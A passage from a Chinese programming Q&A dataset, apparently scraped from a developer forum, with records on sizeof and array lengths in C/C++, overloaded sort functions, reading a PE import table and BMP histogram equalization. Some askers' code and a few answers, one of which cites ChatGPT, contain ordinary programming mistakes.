sort(", "double", "(), ", "double", " len);\n", "void", " ", "show", "(", "int", " iNums[], ", "int", " len);\n", "void", " ", "show", "(", "float", " fNums[], ", "float", " len);\n", "void", " ", "show", "(", "double", " dNums[], ", "double", " len);\n//参数是数组时，参数是指针 \n\n//使用重载实现数组的排序\n", "int", " main()\n{\n    ", "int", " iNums[] = { ", "56", ",", "54", ",", "12", ",", "89", ",", "43", " };\n    ", "float", " fNums[] = { ", "78.0", "f,", "5.7", "f,", "42.8", "f,", "99.1", "f };\n    ", "double", " dNums[] = { ", "78.9", ",", "23.6", ",", "77.3", ",", "98.5", ",", "33.3", " };\n    cout << \"排序前：\";\n    ", "show", "(iNums, sizeof(iNums) / sizeof(iNums[", "0", "]));\n    ", "show", "(fNums, sizeof(fNums) / sizeof(fNums[", "0", "]));\n    ", "show", "(dNums, sizeof(dNums) / sizeof(dNums[", "0", "]));\n    cout << \"排序后：\";\n    sort(iNums, sizeof(iNums) / sizeof(iNums[", "0", "]));\n    sort(fNums, sizeof(fNums) / sizeof(fNums[", "0", "]));\n    sort(dNums, sizeof(dNums) / sizeof(dNums[", "0", "]));\n    ", "show", "(iNums, sizeof(iNums) / sizeof(iNums[", "0", "]));\n    ", "show", "(fNums, sizeof(fNums) / sizeof(fNums[", "0", "]));\n    ", "show", "(dNums, sizeof(dNums) / sizeof(dNums[", "0", "]));\n\n\n\n\n}\n", "void", " sort(", "int", " num[], ", "int", " len)\n{\n    ", "int", " ", "temp", ";\n    ", "for", " (", "int", " i = ", "0", "; i < len - ", "1", "; i++)\n    {\n        ", "for", " (", "int", " j = ", "0", "; j < len - i - ", "1", "; j++)\n        {\n            ", "if", " (num[j] > num[j])\n            {\n                ", "temp", " = num[j];\n                num[j] = num[j + ", "1", "];\n                num[j + ", "1", "] = ", "temp", ";\n            }\n        }\n    }\n}\n", "void", " sort(", "float", " num[], ", "int", " len)\n{\n    ", "float", " ", "temp", ";\n    ", "for", " (", "int", " i = ", "0", "; i < len - ", "1", "; i++)\n    {\n        ", "for", " (", "int", " j = ", "0", "; j < len - i - ", "1", "; j++)\n        {\n            ", "if", " (num[j] > num[j])\n            {\n                ", "temp", " = num[j];\n                num[j] = num[j + ", "1", "];\n                num[j + ", "1", "] = ", "temp", ";\n            }\n        }\n    }\n}\n", "void", " sort(", "double", " num[], ", "double", " len)\n{\n    ", "double", " ", "temp", ";\n    ", "for", " (", "int", " i = ", "0", "; i < len - ", "1", "; i++)\n    {\n        ", "for", " (", "int", " j = ", "0", "; j < len - i - ", "1", "; j++)\n        {\n            ", "if", " (num[j] > num[j])\n            {\n                ", "temp", " = num[j];\n                num[j] = num[j + ", "1", "];\n                num[j + ", "1", "] = ", "temp", ";\n            }\n        }\n    }\n}\n", "void", " ", "show", "(", "int", " iNums[], ", "int", " len)\n{\n    ", "for", " (", "int", " i = ", "0", "; i < len; i++)\n    {\n        cout << iNums[i] << ", "'\\t'", ";\n    }\n    cout << endl;\n}\n", "void", " ", "show", "(", "float", " fNums[], ", "float", " len)\n{\n    ", "for", " (", "int", " i = ", "0", "; i < len; i++)\n    {\n        cout << fNums[i] << ", "'\\t'", ";\n    }\n    cout << endl;\n}\n", "void", " ", "show", "(", "double", " dNums[], ", "double", " len)\n{\n    ", "for", " (", "int", " i = ", "0", "; i < len; i++)\n    {\n        cout << dNums[i] << ", "'\\t'", ";\n    }\n    cout << endl;\n}\n"]], "Tag": "程序设计"}
{"Answer": "sizeof(str1)是编译期的，得到的是字符串对象占用的内存。假设字符串对象这么实现的：\r\nclass string\r\n{\r\nprivate:\r\nchar * pstr;\r\nint bufflen;\r\n...\r\npublic:\r\nint size();\r\nstring append(string&amp; s);\r\nstring substr(string&amp; s);\r\n...\r\n};\r\nsizeof返回的是这个类占用了多少空间，而不是其中的真正的字符串指针pstr指向的字符串的存储空间，前者是固定的。\r\n\r\n而size() length() 都是函数，运行的时候计算的结果，返回字符串的长度。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["超级无敌小白求助：基本功不好，看不懂函数的意思！！！请求帮助", ["sizeof(str1)和str1.size()有什么不同", "\n\n", "sizeof(str1)和str1.size()有什么不同\n"]], "Tag": "程序设计"}
{"Answer": "int bs(int list[100], int item)\r\n数组作为函数参数，传递的是数组首地址。sizeof（list）得到的是指针大小。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于c++函数中数组大小的问题", ["先上代码", "\n\n", "#include <iostream>\n#include <string>\n#include <cstring>\nusing namespace std;\nint bs(int list[100], int item)\n{\n    int low = 0;\n    int high = 99;\n    cout <<sizeof(list)/sizeof(list[0])<<endl;\n    while (low <= high)\n    {\n        int mid = (low + high) / 2;\n        int guess = list[mid];\n        if (guess == item)\n        {\n            return mid;\n        }\n        else if (guess > item)\n        {\n            high = mid - 1;\n        }\n        else\n        {\n            low = mid + 1;\n        }\n    }\n    return -1;\n}\nint main()\n{\n    int list[100];\n    for (int i = 0; i < 100; i++)\n    {\n        list[i] = i + 1;\n    }\n    cout <<sizeof(list)/sizeof(list[0])<<endl;\n    int as = bs(list, 77);\n    if (as == -1)\n    {\n        cerr << \"faild\";\n    }\n    else\n    {\n        cout << \"Answer is :\" << list[as] << endl;\n    }\n    return 0;\n}\n", "\n\n", "我的问题是 在bs函数中 sizeof(list)/sizeof(list[0]) 结果为 1", "\n但是 在 主函数中 sizeof(list)/sizeof(list[0]) 结果就为100 这是为什么？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;如果你传入的是指针而不是数组类型&lt;br /&gt;你应该多加一个变量&amp;#xff0c;同时传入长度&lt;br /&gt;否则鬼知道数组到底多长&lt;br /&gt;而且数组类型是不可变长度的&amp;#xff0c;所以一般定义的时候都会稍大&amp;#xff0c;没有那么正好的&amp;#xff0c;里面大概率并不是所有的元素都存放着数据&lt;br /&gt;所以不管你传一个数组类型进来还是一个数组指针&amp;#xff0c;其实都应该再传一个int&lt;br /&gt;告诉函数到底有多少数据需要处理&lt;br /&gt;-&amp;#61;-&amp;#61;-&amp;#61;&lt;br /&gt;举个例子&lt;br /&gt;你要写个函数&amp;#xff0c;找到数组里面的最小值&lt;br /&gt;正常最小值比方说是5吧&lt;br /&gt;可是你数组长度是100&amp;#xff0c;其中只有前10个有数据&amp;#xff0c;后面都是0&lt;br /&gt;那你无脑遍历整个数组&amp;#xff0c;就会认为最小的数据是0&lt;br /&gt;-&amp;#61;-&amp;#61;-&amp;#61;-&lt;br /&gt;所以说&amp;#xff0c;遍历数组就是个伪问题&amp;#xff0c;数组就不应该遍历&amp;#xff0c;就必须传入一个数来限制循环次数&amp;#xff0c;而不是从头循环到尾&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c不知道整型数组长度的情况下怎么遍历数组", ["如题,", "用函数处理整型数组,但只能传递数组头指针.", "然而通过头指针我没办法获取数组长度啊,", "\n", "sizeof", "(list) / ", "sizeof", "(list[", "0", "]); ", "//结果永远是1", "\n", "\n", "这样怎么才能遍历数组?"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;int num&amp;#61;sizeof(arr)/sizeof(arr[0]);&lt;br /&gt;这个在函数中是无效的&lt;br /&gt;在函数中只知道arr是个int*类型&amp;#xff0c;不知道它是数组&amp;#xff0c;更不知道数组有多少个元素。&lt;br /&gt;sizeof(arr)得到的是指针的大小&amp;#xff0c;也就是4&amp;#xff0c;而不是数组所占的空间大小&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言关于指针的小问题", ["#include<stdio.h>", "//注本机是64位系统", "void test(int arr[]){//等价于*arr", "    int num=sizeof(arr)/sizeof(arr[0]);", "    printf(\"%d\\n\",num);//2", "}", "int main(){", "    int arr[10]={0};", "    test(arr);", "    printf(\"%d\",sizeof(arr)/sizeof(arr[0]));//10", "    return 0;", "}", "分析一下函数中输出为什么是2"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;偏移错了&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["读取x64文件的pe结构导入表的问题", ["rewind(fp);\nfread(&DOS_header, ", "sizeof", "(struct ", "_IMAGE_DOS_HEADER", "), ", "1", ", fp);\n\n    fseek(fp, DOS_header.e_lfanew, ", "0", ");\n    fread(&nt_header, ", "sizeof", "(struct ", "_IMAGE_NT_HEADERS", "), ", "1", ", fp);\n psection_header = new IMAGE_SECTION_HEADER[nt_header.FileHeader.NumberOfSections];\n    fread(psection_header, nt_header.FileHeader.NumberOfSections * ", "sizeof", "(struct ", "_IMAGE_SECTION_HEADER", "), ", "1", ", fp);\nPIMAGE_NT_HEADERS64 pNTHeader = (PIMAGE_NT_HEADERS64)&nt_header;\n        int nSectionNum = pNTHeader->FileHeader.NumberOfSections;\n        DWORD Addr = pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;\n        DWORD ", "Size", " = pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].", "Size", " - ", "sizeof", "(IMAGE_IMPORT_DESCRIPTOR);\n        ", "while", " (", "Size", " > ", "0", ")\n        {\n            int nImportOffset = rva_to_raw(psection_header, nSectionNum, Addr);\n            ", "if", " (!nImportOffset) {\n                ", "break", ";\n            }\n            printf(", "\"%p--%p--%p\"", ", nSectionNum,Addr, nImportOffset);\n            fseek(fp, nImportOffset, SEEK_SET);\n            IMAGE_IMPORT_DESCRIPTOR import_table = { ", "0", " };\n            fread(&import_table, ", "sizeof", "(IMAGE_IMPORT_DESCRIPTOR), ", "1", ", fp);\n            fseek(fp, rva_to_raw(psection_header, nSectionNum, import_table.", "Name", "), SEEK_SET);\n            char dll_name[", "300", "] = { ", "0", " };\n            fread(dll_name, ", "300", ", ", "1", ", fp);\n            printf(", "\"%s\\r\\n\"", ", dll_name);\n            Addr += ", "sizeof", "(IMAGE_IMPORT_DESCRIPTOR);\n            ", "Size", " -= ", "sizeof", "(IMAGE_IMPORT_DESCRIPTOR);\n        }\n", "\n", "// 内存偏移转文件偏移", "\n", "int", " rva", "_to_raw(PIMAGE_SECTION_HEADER ", "pSection", ", ", "int", " ", "nSectionNum", ", ", "int", " ", "nRva", ")", "\n{\n    ", "int", " nRet = ", "0", ";\n\n    ", "// 遍历节区", "\n    ", "for", " (", "int", " i = ", "0", "; i < nSectionNum; i++) {\n        ", "// 导出表地址在这个节区内", "\n        ", "if", " (pSection", "[", "i", "]", ".VirtualAddress <= nRva", " && ", "nRva < pSection", "[", "i", " + ", "1", "]", ".VirtualAddress) {\n            ", "// 文件偏移 = 该段的 PointerToRawData + （内存偏移 - 该段起始的RVA(VirtualAddress)）", "\n            nRet = nRva - pSection", "[", "i", "]", ".VirtualAddress + pSection", "[", "i", "]", ".PointerToRawData;\n            break;\n        }\n    }\n\n    return nRet;\n}\n\n", "\n", "这段代码无法正常输出导入表的dll名称，但是我看Addr 的地址是对的，而且同样的逻辑读取x86文件可以成功获取"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;就是6&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["sizsof相关的东东 C语言", ["double a【6】=｛1，2，3｝；", "表达式（sizeof a/sizeof*a）的值是不是6啊", "不是的话 是几啊", "why啊啊啊"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;该回答引用ChatGPT &lt;/p&gt;\n&lt;p&gt;您的程序存在一些问题&amp;#xff0c;导致输出的 BMP 文件无法正确显示。以下是我发现的几个问题&amp;#xff1a;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;1、文件头信息块&amp;#xff08;BITMAPFILEHEADER&amp;#xff09;和图像描述信息块&amp;#xff08;BITMAPINFOHEADER&amp;#xff09;中的成员应该按照 BMP 文件格式的要求进行对齐。对于结构体成员变量&amp;#xff0c;编译器会默认进行字节对齐&amp;#xff0c;但是结构体中不同成员之间的空隙大小需要手动计算。具体而言&amp;#xff0c;BITMAPFILEHEADER 和 BITMAPINFOHEADER 结构体中的成员变量应该按照如下方式进行定义&amp;#xff1a;&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre&gt;&lt;code class=\"language-bash\"&gt;typedef struct tBITMAPFILEHEADER\n{\n    WORD bfType; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 文件类型&amp;#xff0c;应该为 &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;x4d42\n    DWORD bfSize; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; BMP 文件大小&amp;#xff0c;单位是字节\n    WORD bfReserved1; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 保留&amp;#xff0c;必须设置为 &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;\n    WORD bfReserved2; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 保留&amp;#xff0c;必须设置为 &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;\n    DWORD bfOffBits; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 位图数据的起始位置&amp;#xff0c;单位是字节\n} TBH;\n\ntypedef struct tBITMAPINFOHEADER\n{\n    DWORD biSize; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 信息头大小&amp;#xff0c;一般为 &lt;span class=\"hljs-number\"&gt;40&lt;/span&gt; 字节\n    LONG biWidth; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 图像宽度&amp;#xff0c;单位是像素\n    LONG biHeight; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 图像高度&amp;#xff0c;单位是像素&amp;#xff0c;如果是正数&amp;#xff0c;表示图像自下向上排列&amp;#xff1b;如果是负数&amp;#xff0c;表示图像自上向下排列\n    WORD biPlanes; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 图像数据平面数&amp;#xff0c;一般设置为 &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;\n    WORD biBitCount; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 图像数据位数&amp;#xff0c;一般设置为 &lt;span class=\"hljs-number\"&gt;24&lt;/span&gt;\n    DWORD biCompression; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 图像压缩类型&amp;#xff0c;一般设置为 &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;\n    DWORD biSizeImage; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 图像数据大小&amp;#xff0c;单位是字节\n    LONG biXPelsPerMeter; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 水平分辨率&amp;#xff0c;单位是像素/米\n    LONG biYPelsPerMeter; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 垂直分辨率&amp;#xff0c;单位是像素/米\n    DWORD biClrUsed; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 颜色表中实际使用的颜色数&amp;#xff0c;一般为 &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;\n    DWORD biClrImportant; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; 颜色表中重要的颜色数&amp;#xff0c;一般为 &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;\n} TBI;\n\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;blockquote&gt;\n&lt;p&gt;2、BMP 文件中的像素数据的存储方式有点复杂。一般而言&amp;#xff0c;像素数据按照行顺序存储&amp;#xff0c;每一行的像素从左到右依次存储&amp;#xff0c;每个像素按照 BGR 顺序依次存储。每一行的像素数应该满足 4 字节对齐&amp;#xff08;也就是说&amp;#xff0c;每行像素的字节数应该是 4 的倍数&amp;#xff09;&amp;#xff0c;如果不足 4 字节&amp;#xff0c;则需要用 0 填充。在读取像素数据时&amp;#xff0c;需要先计算每行像素占用的字节数&amp;#xff08;即 biWidth 像素实际像素占用的字节数&amp;#xff0c;如果不足 4 的倍数则需要补齐&amp;#xff09;&amp;#xff0c;然后按照行顺序读取每个像素的 BGR 值。在写入像素数据时&amp;#xff0c;需要按照行顺序写入每个像素的 BGR 值&amp;#xff0c;注意写入时的字节顺序应该是 BGR。&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;blockquote&gt;\n&lt;p&gt;3、在计算像素灰度直方图时&amp;#xff0c;需要根据像素的 BGR 值进行统计&amp;#xff0c;然后计算各个灰度级别的像素占比。您在代码中使用了浮点数数组来记录灰度级别占比&amp;#xff0c;但是没有将像素灰度值进行归一化&amp;#xff0c;导致计算结果不正确。具体而言&amp;#xff0c;您需要先计算像素总数&amp;#xff0c;然后统计各个灰度级别像素的数量&amp;#xff0c;最后将像素数量除以像素总数即可得到对应的像素占比。&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;blockquote&gt;\n&lt;p&gt;4、最后一个问题是&amp;#xff0c;您的程序没有对 BMP 文件的读取位置进行正确的设置。在读取 BMP 文件时&amp;#xff0c;需要先读取文件头信息块和图像描述信息块&amp;#xff0c;然后才能读取像素数据。在写入 BMP 文件时&amp;#xff0c;需要先将文件头信息块和图像描述信息块写入文件&amp;#xff0c;然后才能写入像素数据。因此&amp;#xff0c;在读取和写入文件时需要使用 fseek 函数来设置读取/写入位置。&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;修改后的代码&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-bash\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;unsigned&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; BYTE;  &lt;span class=\"hljs-comment\"&gt;// 定义BYTE为一个字节的类型&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;unsigned&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;short&lt;/span&gt; WORD; &lt;span class=\"hljs-comment\"&gt;// 定义WORD为两个字节的类型&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;unsigned&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; DWORD;  &lt;span class=\"hljs-comment\"&gt;// 定义DWORD为四个字节的类型&lt;/span&gt;\n\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;pragma&lt;/span&gt; pack(push, 1) &lt;span class=\"hljs-comment\"&gt;// 取消对齐&lt;/span&gt;&lt;/span&gt;\n\n&lt;span class=\"hljs-comment\"&gt;//14 Bytes 文件头信息块&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;tBITMAPFILEHEADER&lt;/span&gt;\n{\n    WORD bfType;        &lt;span class=\"hljs-comment\"&gt;// 文件类型&amp;#xff0c;应该为 0x4d42&lt;/span&gt;\n    DWORD bfSize;       &lt;span class=\"hljs-comment\"&gt;// BMP 文件大小&amp;#xff0c;单位是字节&lt;/span&gt;\n    WORD bfReserved1;   &lt;span class=\"hljs-comment\"&gt;// 保留&amp;#xff0c;必须设置为 0&lt;/span&gt;\n    WORD bfReserved2;   &lt;span class=\"hljs-comment\"&gt;// 保留&amp;#xff0c;必须设置为 0&lt;/span&gt;\n    DWORD bfOffBits;    &lt;span class=\"hljs-comment\"&gt;// 位图数据的起始位置&amp;#xff0c;单位是字节&lt;/span&gt;\n} TBH;\n\n&lt;span class=\"hljs-comment\"&gt;//40 Bytes 图像描述信息块&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;tBITMAPINFOHEADER&lt;/span&gt;\n{\n    DWORD biSize;            &lt;span class=\"hljs-comment\"&gt;// 信息头大小&amp;#xff0c;一般为 40 字节&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;int32_t&lt;/span&gt; biWidth;         &lt;span class=\"hljs-comment\"&gt;// 图像宽度&amp;#xff0c;单位是像素&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;int32_t&lt;/span&gt; biHeight;        &lt;span class=\"hljs-comment\"&gt;// 图像高度&amp;#xff0c;单位是像素&amp;#xff0c;如果是正数&amp;#xff0c;表示图像自下向上排列&amp;#xff1b;如果是负数&amp;#xff0c;表示图像自上向下排列&lt;/span&gt;\n    WORD biPlanes;           &lt;span class=\"hljs-comment\"&gt;// 图像数据平面数&amp;#xff0c;一般设置为 1&lt;/span&gt;\n    WORD biBitCount;         &lt;span class=\"hljs-comment\"&gt;// 图像数据位数&amp;#xff0c;一般设置为 24&lt;/span&gt;\n    DWORD biCompression;     &lt;span class=\"hljs-comment\"&gt;// 图像压缩类型&amp;#xff0c;一般设置为 0&lt;/span&gt;\n    DWORD biSizeImage;       &lt;span class=\"hljs-comment\"&gt;// 图像数据大小&amp;#xff0c;单位是字节&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;int32_t&lt;/span&gt; biXPelsPerMeter; &lt;span class=\"hljs-comment\"&gt;// 水平分辨率&amp;#xff0c;单位是像素/米&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;int32_t&lt;/span&gt; biYPelsPerMeter; &lt;span class=\"hljs-comment\"&gt;// 垂直分辨率&amp;#xff0c;单位是像素/米&lt;/span&gt;\n    DWORD biClrUsed;         &lt;span class=\"hljs-comment\"&gt;// 颜色表中实际使用的颜色数&amp;#xff0c;一般为 0&lt;/span&gt;\n    DWORD biClrImportant;    &lt;span class=\"hljs-comment\"&gt;// 颜色表中重要的颜色数&amp;#xff0c;一般为 0&lt;/span&gt;\n} TBI;\n\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;PerPixelgbr&lt;/span&gt;\n{\n    BYTE b;\n    BYTE g;\n    BYTE r;\n} BGR;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    FILE* in;\n    FILE* out;\n    TBH BITMAPFILEHEADER;\n    TBI BITMAPINFOHEADER;\n    BGR* pixels;\n\n    &lt;span class=\"hljs-built_in\"&gt;fopen_s&lt;/span&gt;(&amp;amp;in, &lt;span class=\"hljs-string\"&gt;&amp;#34;input.bmp&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-string\"&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!in) {\n        &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;Error opening input file!\\n&amp;#34;&lt;/span&gt;);\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    }\n\n    &lt;span class=\"hljs-comment\"&gt;// 读取文件头信息块&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;fread&lt;/span&gt;(&amp;amp;BITMAPFILEHEADER, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(TBH), &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, in);\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (BITMAPFILEHEADER.bfType !&amp;#61; &lt;span class=\"hljs-number\"&gt;0x4d42&lt;/span&gt;) {\n        &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;Error: Not a BMP file!\\n&amp;#34;&lt;/span&gt;);\n        &lt;span class=\"hljs-built_in\"&gt;fclose&lt;/span&gt;(in);\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    }\n\n    &lt;span class=\"hljs-comment\"&gt;// 读取图像描述信息块&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;fread&lt;/span&gt;(&amp;amp;BITMAPINFOHEADER, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(TBI), &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, in);\n\n    &lt;span class=\"hljs-comment\"&gt;// 计算像素数据大小&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;uint32_t&lt;/span&gt; imageSize &amp;#61; BITMAPINFOHEADER.biWidth * BITMAPINFOHEADER.biHeight * &lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;;\n    &lt;span class=\"hljs-comment\"&gt;// 计算每行字节对齐所需的填充字节数&lt;/span&gt;\n&lt;span class=\"hljs-type\"&gt;uint32_t&lt;/span&gt; paddingSize &amp;#61; (&lt;span class=\"hljs-number\"&gt;4&lt;/span&gt; - (imageSize % &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;)) % &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;;\n\n&lt;span class=\"hljs-comment\"&gt;// 分配像素数据缓存区&lt;/span&gt;\npixels &amp;#61; (BGR*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(imageSize);\n\n&lt;span class=\"hljs-comment\"&gt;// 读取像素数据&lt;/span&gt;\n&lt;span class=\"hljs-built_in\"&gt;fread&lt;/span&gt;(pixels, &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, imageSize, in);\n\n&lt;span class=\"hljs-built_in\"&gt;fclose&lt;/span&gt;(in);\n\n&lt;span class=\"hljs-comment\"&gt;// 对每个通道进行直方图均衡化&lt;/span&gt;\n&lt;span class=\"hljs-type\"&gt;uint32_t&lt;/span&gt; B_ZFT[&lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;] &amp;#61; { &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt; }, G_ZFT[&lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;] &amp;#61; { &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt; }, R_ZFT[&lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;] &amp;#61; { &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt; };\n&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt; B_GL[&lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;], G_GL[&lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;], R_GL[&lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;];\n\n&lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; BITMAPINFOHEADER.biWidth * BITMAPINFOHEADER.biHeight; i&amp;#43;&amp;#43;)\n{\n    B_ZFT[pixels[i].b]&amp;#43;&amp;#43;;\n    G_ZFT[pixels[i].g]&amp;#43;&amp;#43;;\n    R_ZFT[pixels[i].r]&amp;#43;&amp;#43;;\n}\n\n&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt; gailvhe &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n&lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;; i&amp;#43;&amp;#43;)\n{\n    gailvhe &amp;#43;&amp;#61; (&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;)B_ZFT[i] / ((&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;)BITMAPINFOHEADER.biWidth * (&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;)BITMAPINFOHEADER.biHeight);\n    B_GL[i] &amp;#61; gailvhe;\n}\ngailvhe &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n&lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;; i&amp;#43;&amp;#43;)\n{\n    gailvhe &amp;#43;&amp;#61; (&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;)G_ZFT[i] / ((&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;)BITMAPINFOHEADER.biWidth * (&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;)BITMAPINFOHEADER.biHeight);\n    G_GL[i] &amp;#61; gailvhe;\n}\ngailvhe &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n&lt;span 